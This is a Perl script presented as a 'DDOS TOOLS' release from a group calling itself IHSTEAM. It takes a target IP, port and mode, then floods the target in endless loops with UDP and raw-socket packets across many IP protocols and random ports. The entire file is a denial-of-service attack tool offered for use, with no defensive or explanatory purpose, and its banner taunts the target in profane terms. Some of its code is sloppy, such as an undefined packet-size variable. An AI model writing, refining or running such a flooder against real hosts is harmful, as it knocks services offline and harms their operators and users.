#!/usr/bin/perl
# Mr ROOT and ASHIANE - rubika.ir/TheServer
# DDOS TOOLS
# socket 
#---------------------------- 
use Socket;

# socket library

$ARGC=@ARGV;

if ($ARGC !=3) {
 system("clear");
 system ("sleep 2");
 printf "\n";
 printf "\033[36m[ Welcome to IHSTEAM Priv8 Tools ]\n\n";
 system ("sleep 0.5");
 printf "\033[93m$0 <ip> <port> <time>\n\n";
 system ("sleep 0.5");
 printf "\033[36mfor \033[35m[FUCK]\033[36m the target use this example :\n\n";
 system ("sleep 0.5");
 printf "\033[92m$0 <ip> 0 0\n\n";
 system ("sleep 0.5");
 printf "$0 <ip> 2 2\n\n";
 system ("sleep 0.5");
 printf "if port = 0,2 and time = 0,2 that means, randports/continous packets.\n\n";
 exit(1);
}
system("sleep 2");
system("clear");
sleep(2);
print ("\033[92m\n");
system("date");
system ("sleep 5");
print ("\n\n");

my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[1];
$time=$ARGV[2];

socket(SOCK1, PF_INET, SOCK_DGRAM, 17);
socket(SOCK2, PF_INET, SOCK_RAW, 2);
socket(SOCK3, PF_INET, SOCK_RAW, 1);
socket(SOCK4, PF_INET, SOCK_RAW, 6);
$iaddr = inet_aton("$ip");

printf "\n\n\033[36m[ăŧŧăčĸ] \033[92mstart \033[35mFUCK YOU\033[93m | \033[31m$ip\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
   goto randpackets;
}

if ($ARGV[1] !=0 && $ARGV[2] ==0) {
   goto packet;
}

if ($ARGV[1] ==2 && $ARGV[2] ==2) {
    goto randpacket;
}


packet:
for(;;) {
   $size=$rand x $rand x $rand;
   send(SOCK1, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK2, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK3, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK4, 0, $size, sockaddr_in($port, $iaddr));
}


randpacket:
for(;;) {
   $size=$rand x $rand x $rand;
   $port=int(rand 65000)+1;
   for($i = 3; $i <= 255; $i++) {
       next if $i == 6;
       socket(SOCK5, PF_INET, SOCK_RAW, $i) or next;
       send(SOCK5, 0, $size, sockaddr_in($port, $iaddr));
   }
} 

randpackets:
for(;;) {
   $size=$rand x $rand x $rand;
   $port=int(rand 65000) +1;
   send(SOCK1, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK2, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK3, 0, $size, sockaddr_in($port, $iaddr));
   send(SOCK4, 0, $size, sockaddr_in($port, $iaddr));
}
